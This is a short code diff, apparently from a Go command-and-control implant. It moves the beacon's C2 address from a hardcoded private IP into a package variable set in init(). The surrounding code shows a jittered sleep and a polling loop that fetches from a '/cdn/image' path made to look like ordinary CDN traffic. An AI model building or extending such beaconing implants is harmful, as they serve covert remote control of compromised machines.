@@ -14,6 +14,12 @@ import (
 var baseSleep = 5 * time.Second
 var jitterMin = 0.8
 var jitterMax = 1.2
+var defaultC2 = "https://127.0.0.1"
+var c2URL string
+
+func init() {
+	c2URL = defaultC2
+}
 
 func main() {
 	client := &http.Client{
@@ -23,8 +29,6 @@ func main() {
 			},
 		},
 	}
-
-	c2URL := "https://192.168.0.4" // Change This
 
 	for {
 		resp, err := client.Get(c2URL + "/cdn/image")
